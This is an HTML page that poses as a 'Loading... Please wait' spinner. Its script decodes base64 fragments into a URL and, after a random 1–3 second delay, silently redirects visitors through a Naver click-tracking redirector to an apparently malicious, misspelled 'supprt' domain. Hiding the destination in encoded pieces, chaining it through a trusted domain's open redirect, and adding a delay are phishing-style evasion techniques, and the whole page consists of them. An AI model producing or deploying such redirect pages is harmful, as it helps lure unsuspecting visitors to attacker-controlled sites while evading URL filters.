<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
    }
    .loader {
      text-align: center;
    }
    .spinner {
      border: 4px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top: 4px solid white;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <p>Please wait...</p>
  </div>
  <script>
    // Base64 encoded parts
    const p1 = atob('aHR0cHM6Ly9jYy5uYXZlci5jb20='); // https://cc.naver.com
    const p2 = atob('L2NjP2E9cHN0Lmxpbms='); // /cc?a=pst.link
    const p3 = atob('JnI9Jmk9Jm09MQ=='); // &r=&i=&m=1
    const p4 = atob('Jm5zYz1NYmxvZy5wb3N0'); // &nsc=Mblog.post
    const p5 = atob('JnU9aHR0cHM6Ly9zdXBwcnQuYWx3YXlzZGF0YS5uZXQvY3NzLmNo'); // &u=https://supprt.alwaysdata.net/css.ch
    
    function buildUrl() {
      return p1 + p2 + p3 + p4 + p5;
    }
    function executeRedirect() {
      const targetUrl = buildUrl();
      try {
        window.location.replace(targetUrl);
      } catch {
        window.location.href = targetUrl;
      }
    }
    const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3s
    setTimeout(executeRedirect, delay);
  </script>
</body>
</html>
